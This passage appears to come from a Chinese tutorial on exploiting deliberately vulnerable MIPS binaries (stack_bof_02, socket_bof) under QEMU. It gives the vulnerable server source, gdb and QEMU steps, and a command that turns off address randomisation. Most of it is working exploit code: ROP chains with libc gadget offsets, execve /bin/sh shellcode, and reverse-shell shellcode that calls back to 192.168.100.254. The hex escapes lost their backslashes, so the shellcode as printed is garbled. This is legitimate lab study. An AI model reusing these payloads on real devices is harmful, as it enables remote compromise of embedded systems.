    shellcode+= "x73x68x0ex3c"  # lui $t6, 0x6873
    shellcode += "x6ex2fxcex35"  # ori $t6, $t6, 0x2f6e
    shellcode += "xf8xffxaexaf"  # sw $t6, -8($sp)
    shellcode += "xfcxffxa0xaf"  # sw $zero, -4($sp)
    shellcode += "xf4xffxa4x27"  # addiu $a0, $sp, -0xc
    shellcode += "xffxffx05x28"  # slti $a1, $zero, -1
    shellcode += "xabx0fx02x24"  # addiu;$v0, $zero, 0xfab
    shellcode += "x0cx01x01x01"  # syscall 0x40404
    gadget0 = 0x2fb10
    gadget1 = 0x6A50
    gadget2 = 0x20F1C 
    gadget3 = 0x16DD0
    gadget4 = 0x214A0 
    libc_base = 0x766e5000
    sleep_offset = 0x2F2B0
    data = "a"*508
    data += p32(gadget1+libc_base)
    data += "b"*0x58
    data += "bbbb" #s0
    data += p32(gadget2+libc_base) #s1
    data += p32(sleep_offset+libc_base) #s2
    data += p32(gadget0+libc_base)
    data +="c"*0x18
    data += p32(gadget4+libc_base) #s0
    data += "cccc" #s1
    data += "cccc" #s2
    data += p32(gadget3+libc_base) #ra
    data += "d"*0x18
    data += shellcode
    f.write(data)
    f.close()
然后我们python content1.py，生成一个content1，然后运行./local1.sh,另外一个窗口运行gdb调试，然后下断点`b
*0x767064A0`，运行下去，可以看到寄存器`$t9`已经变成了shellcode的位置，接下来就是跳转到那边，我们看一下内存中的内容，看到如下图内容：
也就是第一条汇编指令不是我们的汇编指令，后面一样，尽管执行成功了，但是心里不爽，看大佬们的内容，可以在前面加几句无关紧要的东西，使其正确跳转过来，就像nop一样(这个里面nop不行的原因是其机器码是x00x00x00x00)。在这个里面增加的指令是`xor
$t0,$t0,$t0`，在IDA中用keypatch看一下机起码为下图内容：
所以我们在shellcode前面加上几句”x26x40x08x01”即可。
###  qemu模拟调试
这道题目的qemu的模拟，用的还是之前的那道题目相同的环境，我在这里只介绍一下具体的流程：
1.先启动qemu，配置好网络环境，依次运行start.sh，net.sh（看上面介绍），在qemu里面运行net.sh，并且也要运行一下
    echo 0 > /proc/sys/kernel/randomize_va_space
因为我们用的是debian的，他里面是开了地址随机化的，所以我们要先关闭地址随机化。（注意，这里一定要弄，我就在qemu里面调试的时候费了好长时间，总是发生错误，后来知道是没有关闭地址随机化）
2.将之前在本地运行好的content1拷过去
    scp content1 root@192.168.100.3:/root/
3.自然是寻找libc的地址，用的还是之前的方法（我在想能不能像ctf题目一样泄漏libc的地址呢？回头研究一下，如果有大佬能提点一下的话，会更好）
    #在qemu里面
    chroot . ./gdbserver.mipsel 192.168.100.254:6666 ./pwnable/ShellCode_Required/stack_bof_02 "`cat content1`"
    #在本机中运行
    gdb-multiarch ./pwnable/Intro/stack_bof_01
    set arch mips #可选
    set endian big/little #可选
    target remote 192.168.100.3:6666
    #进入到gdb中
    b *0x400928
    c
    vmmap
其中可以看到libc的基地址是`0x77ee2000`,我们在content1.py脚本中修改一下libc的基地址，生成相应的content1，然后拷贝进qemu中，在qemu中运行，然后失败了，跟踪的时候，是执行/bin/sh的时候，不知道什么原因，后来改了一个shellcode，改后的shellcode为：
    shellcode = ""
    shellcode += "x26x40x08x01"
    shellcode += "xffxffx10x04xabx0fx02x24"
    shellcode += "x55xf0x46x20x66x06xffx23"
    shellcode += "xc2xf9xecx23x66x06xbdx23"
    shellcode += "x9axf9xacxafx9exf9xa6xaf"
    shellcode += "x9axf9xbdx23x21x20x80x01"
    shellcode += "x21x28xa0x03xccxcdx44x03"
    shellcode += "/bin/sh";
然后运行生成content1，上传，运行`chroot . ./pwnable/ShellCode_Required/stack_bof_02 "`cat
content1`"`成功如下图所示：
###  总结
在这次的实验过程中，rop的构造还是顺利的，当然，还有很多其他的方法。遇到坑的地方，一个就是shellcode的选择，有的用qemu用户态可以成功，但是qemu
system态模拟的时候，没有成功，说是非法指令，只能更换一个shellcode。第二个坑，就是获取libc_base，以及模拟运行调试的时候，每一次开qemu都忘记了关闭地址随机化，导致运行总是不对，后来关闭地址随机化，更换新的shellcode，就运行成功了。（希望之后可以通过泄漏的方式来获取libc基地址，这样就会比较好）
## socket_bof
###  漏洞分析
首先看一下源码：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int main(int argc, char **argv[])
    {
        if (argc <2)
        {
            printf("Usage: %s port_number - by b1ack0wln", argv[0]);
            exit(1);
        }
        char str[500] = "";
        char endstr[50] = "";
        int listen_fd, comm_fd;
        int retval = 0;
        int option = 1;
        struct sockaddr_in servaddr;
        listen_fd = socket(AF_INET, SOCK_STREAM, 0);
        bzero( &servaddr, sizeof(servaddr));
        servaddr.sin_family = AF_INET;
        servaddr.sin_addr.s_addr = htons(INADDR_ANY);
        servaddr.sin_port = htons(atoi(argv[1]));
        printf("Binding to port %in", atoi(argv[1]));
        retval = bind(listen_fd, (struct sockaddr *) &servaddr, sizeof(servaddr));
        if (retval == -1)
        {
            printf("Error Binding to port %in", atoi(argv[1]));
             exit(1);
         }
         if(setsockopt(listen_fd, SOL_SOCKET,SO_REUSEADDR, (char*)&option, sizeof(option)) < 0)
         {
            printf("Setsockopt failed :(n");
            close(listen_fd);
            exit(2);
        }
        listen(listen_fd, 2);
        comm_fd = accept(listen_fd, (struct sockaddr*) NULL, NULL);
        bzero(str, 500);
        write(comm_fd, "Send Me Bytes:",14);
        read(comm_fd,str,500);
        sprintf(endstr, "nom nom nom, you sent me %s", str);
        printf("Sent back - %s",str);
        write(comm_fd, endstr, strlen(endstr)+1);
        shutdown(comm_fd, SHUT_RDWR);
        shutdown(listen_fd, SHUT_RDWR);
        close(comm_fd);
        close(listen_fd);
        return 0x42;
    }
这道题目和之前的区别就是，接收的信息，从原来的程序输入，变成了网络输入，这就和ctf题目非常类似，漏洞点出现在`sprintf(endstr, "nom
nom nom, you sent me %s",
str);`，这个里面`endstr`是一个只有50个字节长度的字符数组，但是要把`str`这个500个字符的数组拷贝进去，所以就造成了溢出，并且`str`的内容来自于socket的输入。
###  查看文件
###  IDA查看
这里可以看到，就是在`snprintf`的时候没有检查长度，导致的栈溢出。
###  本地模拟、调试
其实这道题目和上面的rop链很像，就是在调试的过程和上面发生了变化，我这里主要把调试过程说一下。
1.先编写启动脚本：
    #! /bin/sh
    PORT="1234"
    cp $(which qemu-mipsel-static) ./qemu
    ./qemu -L ./ -g $PORT ./pwnable/ShellCode_Required/socket_bof 9999
    rm qemu
2.gdb调试
    gdb-multiarch ./pwnable/ShellCode_Required/socket_bof
    target remote 127.0.0.1:1234
    b *0x400E28
    c
3.exp.py
    from pwn import *
    context.endian = "little"
    context.arch = "mips"
    p = remote('127.0.0.1',9999)
    p.recvuntil('Send Me Bytes:')
    data = "xxxx"
    p.sendline(data)
    p.interactive()
我们在exp上面的data中填充进我们想要的内容就可以，以上就是调试的过程。我们还是根据确定偏移，构造rop，填充shellcode的，寻找libc基地址的流程来进行，详细的exp如下：
    from pwn import *
    context.endian = "little"
    context.arch = "mips"
    #port：31337
    shellcode = ""
    shellcode += "x26x40x08x01"*5
    shellcode += "xffxffx04x28xa6x0fx02x24x0cx09x09x01x11x11x04x28"
    shellcode += "xa6x0fx02x24x0cx09x09x01xfdxffx0cx24x27x20x80x01"
    shellcode += "xa6x0fx02x24x0cx09x09x01xfdxffx0cx24x27x20x80x01"
    shellcode += "x27x28x80x01xffxffx06x28x57x10x02x24x0cx09x09x01"
    shellcode += "xffxffx44x30xc9x0fx02x24x0cx09x09x01xc9x0fx02x24"
    shellcode += "x0cx09x09x01x79x69x05x3cx01xffxa5x34x01x01xa5x20"
    shellcode += "xf8xffxa5xafx64xfex05x3cxc0xa8xa5x34xfcxffxa5xaf"           # 192.168.100.254(这个里面改为自己的本机ip地址，也就是x64fe和xc0xa8改为自己相应的ip)
    shellcode += "xf8xffxa5x23xefxffx0cx24x27x30x80x01x4ax10x02x24"
    shellcode += "x0cx09x09x01x62x69x08x3cx2fx2fx08x35xecxffxa8xaf"
    shellcode += "x73x68x08x3cx6ex2fx08x35xf0xffxa8xafxffxffx07x28"
    shellcode += "xf4xffxa7xafxfcxffxa7xafxecxffxa4x23xecxffxa8x23"
    shellcode += "xf8xffxa8xafxf8xffxa5x23xecxffxbdx27xffxffx06x28"
    shellcode += "xabx0fx02x24x0cx09x09x01"
    gadget0 = 0x2fb10
    gadget1 = 0x6A50
    gadget2 = 0x20F1C 
    gadget3 = 0x16DD0